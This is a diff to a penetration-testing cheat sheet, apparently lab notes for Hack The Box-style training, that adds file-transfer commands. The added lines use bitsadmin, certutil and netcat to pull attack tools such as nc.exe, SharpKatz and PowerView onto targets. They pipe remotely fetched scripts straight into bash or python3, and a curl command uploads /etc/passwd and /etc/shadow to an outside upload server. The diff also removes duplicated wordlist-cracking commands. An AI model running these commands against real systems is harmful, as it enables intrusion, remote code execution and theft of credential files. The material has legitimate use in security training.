@@ -339,6 +339,14 @@ sqlplus <user>/<pass>@<FQDN/IP>/<db>
 
 ##### Windows File Transfer Methods
 ```
+# Download a File Using Bitsadmin 
+bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
+or
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+
+# Download a File Using Certutil 
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+
 # Download a file with PowerShell with Synchronous 
 (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
@@ -383,36 +391,50 @@ sudo python3 -m pyftpdlib --port 21 --write
 ```
 ##### Linux File Transfer Methods
 ```
-# Uses cewl to generate a wordlist based on keywords present on a website.
-cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+# Download a File Using NetCat 
+nc -l -p 8000 > SharpKatz.exe
 
-# Uses Hashcat to generate a rule-based word list.
-hashcat --force password.list -r custom.rule --stdout > mut_password.list
+nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 
-# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
-./username-anarchy -i /path/to/listoffirstandlastnames.txt
+# Download a file using Wget
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+
+# Fileless Download with Wget
+wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+
+# Download a File Using cURL
+curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+# Fileless Download with cURL
+curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+
+# Download a file using SCP
+scp plaintext@192.168.49.128:/root/myroot.txt .
+
+# Upload a file via WebServer 
+sudo python3 -m pip install --user uploadserver
+sudo python3 -m uploadserver 4443
+
+curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+
+# Upload a file using SCP
+scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+
 ```
 ##### Transferring Files with Code
 ```
-# Uses cewl to generate a wordlist based on keywords present on a website.
-cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+# Download a File Using python3
+python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 
-# Uses Hashcat to generate a rule-based word list.
-hashcat --force password.list -r custom.rule --stdout > mut_password.list
+# Download a File Using PHP 
+php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 
-# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
-./username-anarchy -i /path/to/listoffirstandlastnames.txt
-```
-##### Miscellaneous File Transfer Methods
-```
-# Uses cewl to generate a wordlist based on keywords present on a website.
-cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
+# Download a File Using Ruby  
+ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 
-# Uses Hashcat to generate a rule-based word list.
-hashcat --force password.list -r custom.rule --stdout > mut_password.list
+# Download a File Using Perl   
+perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 
-# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
-./username-anarchy -i /path/to/listoffirstandlastnames.txt
 ```
 ## Password Attacks
 
